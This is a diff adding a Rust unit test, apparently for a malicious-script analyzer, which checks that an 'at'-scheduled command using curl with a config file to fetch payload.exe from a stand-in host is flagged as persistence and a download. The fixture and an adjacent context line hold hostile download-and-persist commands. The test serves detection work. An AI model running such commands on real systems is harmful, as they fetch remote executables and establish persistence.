@@ -8003,6 +8003,42 @@ sc failure UpdateSvc command= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod at_scheduler_tests {
+    use crate::{analyze, Config, Trait};
+
+    #[test]
+    fn at_scheduled_cmd_child_is_analyzed() {
+        let script = br#"echo url = "https://at-scheduler.example/payload.exe" > curl.cfg
+at 23:59 cmd.exe /c curl -K curl.cfg -o payload.exe"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command.contains("cmd.exe /c curl -K curl.cfg")
+            )),
+            "at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://at-scheduler.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod cscript_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
